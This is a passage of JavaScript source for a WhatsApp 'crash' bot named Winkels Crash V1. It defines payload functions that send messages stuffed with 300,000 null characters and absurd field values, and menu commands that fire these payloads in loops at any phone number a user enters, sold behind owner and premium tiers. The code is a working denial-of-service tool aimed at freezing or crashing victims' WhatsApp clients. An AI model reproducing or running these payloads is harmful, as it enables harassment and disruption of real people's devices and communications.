                                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                                fileLength: "9999999999999",
                                                pageCount: 1316134911,
                                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                                fileName: " 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 ▻ # 𝖢𝗋𝖺𝗌𝗁 Vcard :)",
                                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                mediaKeyTimestamp: "1724474503",
                                                contactVcard: true,
                                            }
                                        },
                                        externalAdReply: {
                                            title: "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
                                            mediaType: "VIDEO",
                                            sourceUrl: "https://kudel-ganteng.xyz/server/d6c1dfd4/files/",
                                        },
                                    }
                                }
                            },
                            expiryTimestamp: "0",
                            amount: {
                                value: "999999999",
                                offset: 999999999,
                                currencyCode: "XXX",
                            },
                            background: {
                                id: "100",
                                fileLength: "928283",
                                width: 1000,
                                height: 1000,
                                mimetype: "stay withme - 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
                                placeholderArgb: 4278190080,
                                textArgb: 4294967295,
                                subtextArgb: 4278190080,
                            }
                        }
                    }, {});
                    console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
            }
    
    async function wios(target, Ptcp = false) {
			await xwill.relayMessage(target, {
					"extendedTextMessage": {
						"text": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "\u0000".repeat(300000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895351855189@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 99999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895351855189@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
								"body": "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "62895351855189-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "62895351855189-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
		};
           
				// END FUNCT BARU
				
		
				
					
				if (!isApproved) {
					if (!command.includes('acc sayang') && !command.includes('no acc')) {
						if (command) {
							await xwill.sendMessage(m.key.remoteJid, {
								react: { text: '❌', key: m.key }
							});
							if (!hasRequestedApproval) {
								xwill.sendMessage(m.key.remoteJid, { 
									text: '❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306 untuk approval' 
								});
								hasRequestedApproval = true;
							}
	
							if (!hasSentApprovalRequest) {
								const botNumber = xwill.user.id.split(':')[0];
								xwill.sendMessage('6281527641306@s.whatsapp.net', { 
									text: `🤖 Permintaan Persetujuan Bot\n\n📱 Nomor: ${botNumber}\n🔍 Status DB: Terdaftar ✅\nStatus: Menunggu persetujuan` 
								});
								hasSentApprovalRequest = true;
							}
						}
						return;
					}
				}
	
				
		
		let list = []
		for (let i of ownerNumber) {
		list.push({
		displayName: await xwill.getName(i + '@s.whatsapp.net'),
		vcard: `BEGIN:VCARD\n
		VERSION:3.0\n
		N:${await xwill.getName(i + '@s.whatsapp.net')}\n
		FN:${await xwill.getName(i + '@s.whatsapp.net')}\n
		item1.TEL;waid=${i}:${i}\n
		item1.X-ABLabel:Ponsel\n
		item2.EMAIL;type=INTERNET: xwinkelcrash@lol.com\n
		item2.X-ABLabel:Email\n
		item3.URL:https://t.me/KUDELsWINKELID
		item3.X-ABLabel:Telegram\n
		item4.ADR:;;Indonesia;;;;\n
		item4.X-ABLabel:Region\n
		END:VCARD`
		})
		}
		
		function monospace(string) {
		return '```' + string + '```'
		}
		
		
		 
		try {
		ppuser = await xwill.profilePictureUrl(m.sender, 'image')
		} catch (err) {
		ppuser = fs.readFileSync(`./database/xwinkel/xwinkel.jpg`)
		}
		if (!xwill.public) {
		if (!m.key.fromMe) return
		}        
		
		
const reply = (teks) => {
            xwill.sendMessage(m.chat, {
                text: teks,
                contextInfo: {
                    mentionedJid: [sender],
                    forwardingScore: 9999999,
                    isForwarded: true,
                    "externalAdReply": {
                        "showAdAttribution": true,
                        "containsAutoReply": true,
                        "title": `𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1`,
                        "body": `𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1`,
                        "previewType": "PHOTO",
                        "thumbnailUrl": ``,
                        "thumbnail": fs.readFileSync('./database/xwinkel/xwinkel.jpg'),
                        "sourceUrl": 'https://t.me/KUDELsWINKELID'
                    }
                }
            }, { quoted: m });
        }
			
		// END REPLY
		
switch (command) {
		
case 'menu': case 'allmenu': {
if (!isCmd) return;  
const menu = `
Hola *${pushname}*👋
My name is *𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1*
I am a WhatsApp assistant bot created by *bakudels*
I will help you to make your work easier, here is a list of menus provided by us...

━───⟨ OWNER ⟩───━
⺓ - prefix \`‹owner only›\`
⺓ - nonprefix \`‹owner only›\`
⺓ - addprem \`62xxx\`
⺓ - delprem \`62xxx\`
⺓ - addowner \`62xxx\`
⺓ - delowner \`62xxx\`
⺓ - combine \`62xxx\`
⺓ - combinebrutal \`62xxx\`

━───⟨ TOOLS ⟩───━
⺓ - tourl \`‹reply›\`
⺓ - encrypt \`‹reply›\`
⺓ - obf1 \`‹reply›\`
⺓ - obf2 \`‹reply›\`
⺓ - obf3 \`‹reply›\`
⺓ - obfnoc \`‹reply›\`
⺓ - decrypt \`‹reply›\`
⺓ - decrypt1 \`‹code›\`

━───⟨ CRASH ⟩───━
⺓ - xwinkelfr \`62xxx\`
⺓ - xwinkelst \`62xxx\`
⺓ - xwinkelmw \`62xxx\`
⺓ - xwinkel \`62xxx\`
⺓ - wios \`62xxx\`
⺓ - wtrashios \`62xxx\`
⺓ - xw-galaxy \`62xxx\`
⺓ - xw-isekai \`62xxx\`

━───⟨ FUN ⟩───━
⺓ - cekkhodam \`nama\`
⺓ - cekkontol \`nama\`
⺓ - cekmemek \`nama\`

━──⟨ DOWNLOAD ⟩──━
⺓ - tiktok \`‹url›\`
⺓ - ytmp3 \`‹url›\`
⺓ - ytmp4 \`‹url›\`
⺓ - insta \`‹url›\`
⺓ - play \`‹lagu›\`

━──⟨ THANKS TO ⟩──━
⺓ Kudels (DEVELOPER)
⺓ Kuzuroken (DEVELOPER)
⺓ UEELEXITERS (PARTNER)
⺓ NEROX 
━─────────────━
 *乂 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 乂*`;
await xwill.sendMessage(m.key.remoteJid, {
		react: {
			text: '🥶',
			key: m.key,
		}
});
    
await xwill.sendMessage(m.key.remoteJid, { 
	video: preview, 
	gifPlayback: true, 
	caption: menu,
}); 			
break;
}
        
        //KUDELSGANTENG!!!
case 'combine': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isOwner) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.owner);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 5; i++) {
		await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await xwinkelfr(target)
		await sleep(500);
        }
        for (let i = 0; i < 8; i++) {
        await xwinkelst(target)
		await xwinkelst(target)
		await xwinkelst(target) 
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await MatykLu(target)
        await newgalaxy(target)
        await xwinkelst(target)
        await NewsletterZap2(target)
        await xwinkelfr(target)
        await xwinkelfr2(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await xwinkelfr3(target)
        await xwinkelfr(target)
        await sleep(3000);
        }
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in combine:', err);
	}
break;
}
        
case 'combinebrutal': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isOwner) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.owner);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 3; i++) {
		await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await xwinkelfr(target)
        await xwinkel1(target)
        await MatykLu(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await newgalaxy(target)
        await xwinkel2(target)
		await sleep(500);
        }
        for (let i = 0; i < 8; i++) {
        await xwinkelst(target)
		await xwinkelst(target)
		await xwinkelst(target) 
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await xwinkelst(target)
        await NewsletterZap2(target)
        await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await MatykLu(target)
        await newgalaxy(target)
        await xwinkelfr(target)
        await sleep(6000)
        }
        for (let i = 0; i < 3; i++) {
		await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await xwinkelfr(target)
		await sleep(2000);
        }
        for (let i = 0; i < 8; i++) {
        await xwinkelst(target)
		await xwinkelst(target)
		await xwinkelst(target) 
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await MatykLu(target)
        await MatykLu(target)
        await MakanNih(target)
        await newgalaxy(target)
        await xwinkelst(target)
        await NewsletterZap2(target)
        await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await xwinkelfr(target)
        await sleep(5000);
        }
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in combine:', err);
	}
break;
}

case 'xwinkelfr': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 4; i++) {
		await xwinkelfr(target)
		await xwinkelfr(target)
		await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
        await xwinkelfr(target)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in xwinkelfr:', err);
	}
break;
}

case 'xwinkelst': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 4; i++) {
		await xwinkelst(target)
		await xwinkelst(target)
		await xwinkelst(target)
        await xwinkelst(target)
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await xwinkelst(target)
        await xwinkelst(target)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in xwinkelst:', err);
	}
break;
}
        

case 'xwinkelmw': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 5; i++) {
		await NewsletterZap2(target)
		await xwinkelfr(target)
		await NewsletterZap2(target)
        await xwinkelfr3(target)
        await xwinkelfr2(target)
        await xwinkelst(target)
        await NewsletterZap2(target)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in xwinkelmw:', err);
	}
break;
}
        
case 'xwinkel': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 8; i++) {
		await xwinkel1(target)
		await xwinkel1(target)
		await xwinkel1(target)
        await LocatiOn(target)
        await xwinkel1(target)
        await LocatiOn(target)
        await xwinkel2(target)
        await xwinkel2(target)
        await xwinkel2(target)
        await xwinkel1(target)
        await xwinkel2(target)
        await xwinkel1(target)
        await xwinkel2(target)
        await xwinkel1(target)
        await xwinkel2(target)
        await LocatiOn(target)
        await xwinkel1(target)
        await LocatiOn(target)
        await xwinkel2(target)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in xwinkel:', err);
	}
break;
}
        
case 'wios': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 2; i++) {
		await wios(target, Ptcp = true)
        await wios(target, Ptcp = true)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in wios:', err);
	}
break;
}
        
case 'wtrashios': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 2; i++) {
        await xwinkelfr(target)
        await xwinkelfr2(target)
        await xwinkelfr3(target)
		await wios(target, Ptcp = true)
        await wios(target, Ptcp = true)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in wios:', err);
	}
break;
}
        
case 'xw-galaxy': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 2; i++) {
        await EncryptMessage(target, wanted)
        await BugBETA(target, wanted)
		await BugBETA(target)
        await BugBETA(target)
        await EncryptMessage(target, wanted)
		await sleep(500);
}
	await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
	} catch (err) {
		console.error('Error in xw-galaxy:', err);
	}
break;
}
        
case 'xw-isekai': {
	try {
		if (!isApproved) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			});
						
			if (!hasShownApprovalMessage) {
				reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
					hasShownApprovalMessage = true;
				}
				return;
			}
			if (!isPremium) {
			await xwill.sendMessage(m.key.remoteJid, {
				react: { text: '❌', key: m.key }
			})
				return reply(mess.only.premium);
			}
				if (!q) {
				await xwill.sendMessage(m.key.remoteJid, {
					react: { text: '❓', key: m.key }
			})
				return reply(`Use: ${prefix+command} number\nExample: ${prefix+command} 62xxx`);
			}
		await loading()
        await xwill.sendMessage(m.chat, { 
		react: { text: "✅", key: m.key },
	});
		const target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
		for (let i = 0; i < 10; i++) {
		await BlankScreen(target, Ptcp = true)
        await xwinkelfr(target)
        await CallX(target)
        await sleep(500);
        }
		for (let i = 0; i < 10; i++) {
		await BlankScreen(target, Ptcp = true)
        await xwinkelfr2(target)
        await CallX(target)
        await sleep(2000);
        }
        for (let i = 0; i < 10; i++) {
		await BlankScreen(target, Ptcp = true)
        await xwinkelfr3(target)
        await CallX(target)
        await sleep(4000);
        }
        for (let i = 0; i < 10; i++) {
		await BlankScreen(target, Ptcp = true)
        await xwinkelst(target)
        await CallX(target)
        await sleep(6000);
        }
        for (let i = 0; i < 10; i++) {
		await BlankScreen(target, Ptcp = true)
        await xwinkelfr(target)
        await CallX(target)
        await BlankScreen(target, Ptcp = true)
        await sleep(8000);
        }
	} catch (err) {
		console.error('Error in xw-isekai:', err);
	}
break;
}

// END

case 'nonprefix': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner);
    }
    
    usePrefix = false;
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '🤯', key: m.key }
    })
    reply('✅ Mode no-prefix berhasil diaktifkan! Semua command dapat digunakan tanpa titik.');
    break;
}

case 'prefix': {
	if (!isApproved) {
		await xwill.sendMessage(m.key.remoteJid, {
			react: { text: '❌', key: m.key }
		});
		
		if (!hasShownApprovalMessage) {
			reply('❌ Bot belum di ACC! Silahkan hubungi owner 6281527641306');
			hasShownApprovalMessage = true;
		}
		return;
	}
    if (!isOwner) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '❌', key: m.key }
        })
        return reply(mess.only.owner);
    }
    
    usePrefix = true;
    await xwill.sendMessage(m.key.remoteJid, {
        react: { text: '😎', key: m.key }
    })
    reply('✅ Mode prefix berhasil diaktifkan! Semua command harus menggunakan titik.');
    break;
}



case "kontol": {
    if (!isApproved) {
